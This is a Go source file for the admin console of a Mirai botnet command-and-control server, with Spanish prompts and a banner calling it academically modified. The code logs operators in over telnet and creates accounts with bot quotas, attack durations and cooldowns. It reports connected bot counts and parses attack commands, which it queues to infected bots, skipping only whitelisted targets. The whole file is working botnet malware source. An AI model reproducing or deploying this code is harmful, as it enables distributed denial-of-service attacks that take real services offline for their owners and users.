package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[32;1m## User: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[32;1m## Password: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mComprobando... \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[31;1m!> Error conectando a db.\r\n"))
        this.conn.Write([]byte("\033[31m>> Pulsa una tecla para salir... \033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[34;1mDDos Mirai | Iniciando Terminal...\033[0m\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[34;1m*@@@@m     m@@@**@@@@**@@@***@@m        @@      *@@@@*\033[0m"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[34;1m  @@@@    @@@@    @@    @@   *@@m      m@@m       @@  \033[0m"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[34;1m  @ @@   m@ @@    @@    @@   m@@      m@*@@!      @@  \033[0m"))
    this.conn.Write([]byte("\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[34;1m  @  @!  @* @@    @@    !@@@@@@      m@  *@@      @@  \033[0m\r\n"))
    this.conn.Write([]byte("\033[34;1m  !  @!m@*  @@    @!    !@  @@m      @@@!@!@@     @!  \033[0m"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[34;1m  !  *!@*   @@    @!    !@   *!@    !*      @@    @!  \033[0m\r\n"))
    this.conn.Write([]byte("\033[34;1m  !  !!!!*  !!    !!    !@  ! !!     !!!!@!!@     !!  \033[0m\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\033[34;1m  :  *!!*   !!    :!    !!   *!!!   !*      !!    :!  \033[0m"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[34;1m: ::: :   : ::: :!: : : :!:  : : :: : :    : ::: :!: : \033[0m\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n\033[34;1mModificado para fines académicos por José Luis Salinas.\033[0m\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[37;1mPara mas informacion ?\r\n"))


    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots Conectados | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCategory string
        var botCount int
        this.conn.Write([]byte("\n\033[32;1m[*] " + username + "> \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Nuevo username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Nueva password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Introduzca el recuento de bots deseado (-1 para la red completa): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error en el parseo de recuento de bots")))
                continue
            }
            this.conn.Write([]byte("Duración máxima de los ataques (-1 para ninguno): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error en el parseo del limite de duración del ataque ")))
                continue
            }
            this.conn.Write([]byte("Tiempo de enfriamiento (0 para ninguno): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error en el parseo del tiempo de enfriamiento")))
                continue
            }
            this.conn.Write([]byte("Info de cuenta nueva: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinuar? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "No se ha podido crear un nuevo usuario. Se ha producido un error desconocido.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUsuario agregado con exito.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && (cmd == "botcount" || cmd == "bc") {
            m := clientList.Distribution()
            c := clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[36;1mHay %d bots conectados.\033[0m\r\n", c)))
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mError en el parseo botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mEl numero de bots a enviar es mayor que el maximo de bots permitido\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCategory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCategory)
                } else {
                    fmt.Println("Ataque bloqueado para " + username + " en la lista blanca")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
